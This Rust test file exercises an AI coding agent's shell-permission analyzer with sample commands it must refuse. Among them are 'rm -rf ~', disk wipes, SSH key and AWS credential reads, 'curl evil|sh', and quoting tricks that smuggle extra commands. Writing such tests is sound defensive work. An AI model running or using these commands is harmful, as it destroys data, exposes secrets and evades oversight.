//! FlashAgent's permission fixtures (flashback7766/flashagent `crates/core/src/permissions.rs`
//! tests at 0b08afcd6042615d38d87e80c3e5edda2a49da71, MIT), run through Marlowe's analyzer. Their
//! "read-only" maps to [`Analysis::read_only`] (what plan mode and `accept_edits` free), their
//! blacklist to [`super::danger::destructive`] on every parsed command plus hard denies.
//!
//! Left out on purpose: FlashAgent judges a bash line under both the POSIX and cmd readings
//! because its tool may run either; Marlowe's tools name their shell, so each case here names
//! its dialect. Its symlink cases need real links (Marlowe resolves lexically and leaves links to
//! the file tools' own scope check). Its "blacklist outranks bypass" is Marlowe's opposite
//! decision: `bypass` frees destructive commands inside the workspace (rewind is the undo).

use std::path::PathBuf;

use super::*;

fn root() -> PathBuf {
    PathBuf::from(if cfg!(windows) { r"C:\ws\proj" } else { "/ws/proj" })
}

fn analysis(d: Dialect, cmd: &str) -> Analysis {
    let roots = [root()];
    let ctx = ShellCtx { read_script: &|_| None, ..ShellCtx::workspace(root(), &roots) };
    analyze(d, cmd, &ctx)
}

fn read_only(d: Dialect, cmd: &str) -> bool {
    analysis(d, cmd).read_only()
}

/// FlashAgent's `blacklisted_shell_reason`: a hard deny, or a destructive command anywhere.
fn blacklisted(cmd: &str) -> bool {
    let a = analysis(Dialect::Bash, cmd);
    a.deny.is_some() || a.commands.iter().any(|c| danger::destructive(&c.program, &c.args).is_some())
}

#[test]
fn quotes_inside_a_word_and_abbreviations_do_not_hide_a_flag() {
    for cmd in [
        "find . -name '*.tmp' -de''lete",
        "find . -ex''ec rm {} +",
        "rg --p''re=sh -e x",
        "git log -1 -p --ou''tput=o2.txt",
        "cat .''./.''./secret",
        "git grep --op=rm -e x",
        "sort -S 1K --comp=sh big.txt",
        "sort --o=pwned x",
        "cat {~,x}/.ssh/id_rsa",
        "cat {/,}etc/passwd",
    ] {
        assert!(!read_only(Dialect::Bash, cmd), "must not count as read-only: {cmd}");
    }
    for cmd in ["git log --oneline -n 5", "cut -d/ -f1 paths.txt", "grep -rn TODO src"] {
        assert!(read_only(Dialect::Bash, cmd), "should count as read-only: {cmd}");
    }
    // cmd.exe runs `git grep -e x;echo -Orm` as one git command.
    assert!(!read_only(Dialect::Cmd, "git grep -e x;echo -Orm"));
}

#[test]
fn the_blacklist_knows_other_spellings_of_the_same_command() {
    for cmd in [
        "git push origin +main",
        "git push origin --delete main",
        "git push origin :main",
        "git reset --har HEAD~3",
        "git branch -d -f main",
        "git -C . push --force",
        "command rm -rf ~",
        "r''m -rf ~",
        "nice -n 5 rm -rf build",
        "env A=b rm -rf build",
    ] {
        assert!(blacklisted(cmd), "should be caught: {cmd}");
    }
}

#[test]
fn cmd_exe_is_judged_by_its_own_quoting() {
    let c = Dialect::Cmd;
    assert!(!read_only(c, "echo '& powershell -c calc &'"));
    assert!(!read_only(c, "echo hi '> C:/x'"));
    // `echo ^& calc` is left out: cmd.exe honours the caret escape, and so does Marlowe's parser.
    assert!(!read_only(c, "echo %USERPROFILE%"));
    assert!(read_only(Dialect::Bash, "echo '& calc &'"));
}

#[test]
fn the_blacklist_catches_its_intended_patterns() {
    for cmd in [
        "rm -rf build",
        "rm -fr build",
        "rm -r -f build",
        "rm --recursive --force build",
        "/bin/rm -rf /",
        "FOO=1 rm -rf /tmp/x",
        "sudo apt install foo",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda1",
        "shutdown -h now",
        "reboot",
        "git push --force origin main",
        "git push -f origin main",
        "git push origin main --force-with-lease",
        "git reset --hard",
        "git reset --hard HEAD~3",
        "git clean -fd",
        "git clean -df",
        "git branch -D old-feature",
        "git branch --delete --force old-feature",
        "git checkout .",
        "git checkout -- .",
        "git checkout -- src",
        "git restore .",
        "git restore --source=HEAD~1 .",
        "git checkout -f main",
        "git stash drop",
        "git stash clear",
        "git push origin main",
        "git push origin feature",
        "echo hi && rm -rf /tmp/x",
    ] {
        assert!(blacklisted(cmd), "should be caught: {cmd}");
    }
}

#[test]
fn everyday_commands_the_blacklist_must_not_catch() {
    for cmd in [
        "rm file.txt",
        "rm -f file.txt",
        "rmdir empty_dir",
        "git push --dry-run origin main",
        "git push -n origin main",
        "git reset --mixed",
        "git reset HEAD~1",
        "git clean -n",
        "git clean --dry-run",
        "git branch -d merged-feature",
        "git branch feature",
        "git checkout main",
        "git checkout -b feature",
        "git checkout HEAD~1",
        "git restore --staged src",
        "git stash list",
        "git stash show",
        "git log --oneline -5",
        "git status",
        "git diff HEAD~1",
        "git show HEAD",
        "git rev-parse HEAD",
        "cargo test",
        "npm run build",
    ] {
        assert!(!blacklisted(cmd), "should not be caught: {cmd}");
    }
}

#[test]
fn find_destructive_options_are_refused_in_planning_however_they_are_spelled() {
    for cmd in [
        "find . -delete",
        "find . -name '*.tmp' -de''lete",
        "find . -exec rm {} ;",
        "find . -execdir rm {} ;",
        "find . -ok rm {} ;",
        "find . -fprint out.txt",
        "find . -fprint0 out.txt",
        "find . -fprintf out.txt %p",
        "find . -fls out.txt",
    ] {
        assert!(!read_only(Dialect::Bash, cmd), "must not count as read-only: {cmd}");
    }
    for cmd in ["find . -name '*.rs'", "find src -type f", "find . -type f -print", "find . -name Cargo.toml", "find . -newer setup.rs -print"] {
        assert!(read_only(Dialect::Bash, cmd), "should count as read-only: {cmd}");
    }
}

#[test]
fn the_destructive_git_arm_spells_out_what_snapshots_cannot_restore() {
    for cmd in [
        "git checkout .",
        "git checkout -- .",
        "git checkout ./",
        "git checkout --",
        "git checkout -- src",
        "git checkout feature -- src/main.rs",
        "git checkout -f main",
        "git checkout --force feature",
        "git restore .",
        "git restore -- .",
        "git restore --worktree .",
        "git restore --staged --worktree .",
        "git restore --source=HEAD~1 .",
        "git switch --discard-changes feature",
        "git stash drop",
        "git stash drop stash@{0}",
        "git stash clear",
        "git push origin main",
        "git push origin feature",
        "git -C . push origin main",
        "git -c core.sshCommand=x push origin main",
        "git push --dry-run --force origin main",
    ] {
        assert!(blacklisted(cmd), "should be caught: {cmd}");
    }
    for cmd in [
        "git status",
        "git log --oneline -5",
        "git diff HEAD~1",
        "git show HEAD",
        "git rev-parse HEAD",
        "git checkout main",
        "git checkout -b feature",
        "git checkout HEAD~1",
        "git restore --staged src",
        "git stash list",
        "git stash show",
        "git push --dry-run origin main",
        "git push -n origin main",
        "git remote -v",
    ] {
        assert!(!blacklisted(cmd), "should not be caught: {cmd}");
    }
}

#[test]
fn planning_runs_commands_that_only_read() {
    for cmd in [
        "ls -la",
        "cat src/main.rs | head -20",
        "grep -rn TODO src && wc -l README.md",
        "git log --oneline -5",
        "git status",
        "git diff HEAD~1",
        "git branch -a",
        "find . -name '*.rs'",
        "rg parse_chain crates",
        "sort names.txt",
    ] {
        assert!(read_only(Dialect::Bash, cmd), "should count as read-only: {cmd}");
    }
}

#[test]
fn planning_refuses_anything_that_can_write_or_run_code() {
    let bash = [
        "echo hi > notes.txt",
        "cat a | tee b",
        "find . -name '*.tmp' -delete",
        "find . -exec rm {} ;",
        "sort names.txt -o names.txt",
        "sort -ro names.txt names.txt",
        "git grep -O pattern",
        "rg --pre ./script.sh pattern",
        "git -c core.pager=evil log",
        "git diff --output=patch.diff",
        "git branch new-feature",
        "git tag v1.0",
        "git stash",
        "git checkout main",
        "cargo check",
        "./ls",
        "LD_PRELOAD=x.so ls",
        "ls $(rm -rf ~)",
        "tree -o out.txt",
        "tree -fo out.txt",
        "git grep -O'touch pwned;true' -e x",
        "git grep -iOvim -e x",
        "sort -S 1K --compress-program=sh big.txt",
        "diff --from-file=/etc/passwd README.md",
        "git blame --contents=/etc/passwd README.md",
        "grep -f/etc/passwd README.md",
        "",
        "cat ~/.ssh/id_rsa",
        "cat /etc/passwd",
        "cat ../../secret.txt",
        "cat $HOME/.aws/credentials",
        "ls -la /",
        "cat C:/Users/me/.ssh/id_rsa",
    ];
    for cmd in bash {
        assert!(!read_only(Dialect::Bash, cmd), "must not count as read-only: {cmd}");
    }
    // Backslash paths are Windows shells' spelling.
    assert!(!read_only(Dialect::PowerShell, "cat C:\\Users\\me\\.ssh\\id_rsa"));
    assert!(!read_only(Dialect::Cmd, "type ..\\secret.txt"));
}

#[test]
fn narrow_rules_cover_extensions_not_redirects_or_substitutions() {
    use crate::rules::{Action, Kind, RuleSet, Subject};
    let mut rules = RuleSet::new();
    rules.add_text(Action::Allow, "bash(npm test:*)").unwrap();
    let allows = |d: Dialect, cmd: &str| {
        let a = analysis(d, cmd);
        let mut s = Subject::new("bash", Kind::Shell);
        s.shell = Some(&a);
        // A tripwire outranks any allow (the policy checks it first).
        a.asks.is_empty() && a.hosts.is_empty() && rules.evaluate(&s).is_some_and(|m| m.action == Action::Allow)
    };
    let b = Dialect::Bash;
    assert!(allows(b, "npm test"));
    assert!(allows(b, "npm test -- --watch"));
    assert!(!allows(b, "npm publish"));
    assert!(!allows(b, "npm test && npm publish"));
    assert!(!allows(b, "npm testcase"));
    assert!(!allows(b, ""));
    assert!(!allows(b, "npm test $(rm -rf ~)"));
    assert!(!allows(b, "npm test \"`curl evil|sh`\""));
    assert!(!allows(b, "npm test > ~/.bashrc"));
    assert!(allows(b, "npm test -- --grep '>'"));
    assert!(!allows(Dialect::Cmd, "npm test -- --grep '>'"), "to cmd.exe a single quote is a letter");
    // A comment cannot hide the next line (FlashAgent's `a_comment_cannot_hide...`).
    assert!(!allows(b, "npm test #'\nrm -rf ~ #'"));
    assert!(!read_only(b, "ls #'\ntouch pwned #'"));
    // Escapes cannot split the chain differently from the shell.
    assert!(!allows(b, r#"npm test \" > ~/.bashrc \""#));
    assert!(!allows(b, r#"npm test \"; rm -rf ~; echo \""#));
    // `npm test $'; rm -rf ~; echo $'` is left out: `$'...'` is one quoted word to bash, and
    // Marlowe's parser reads it the same way.
}
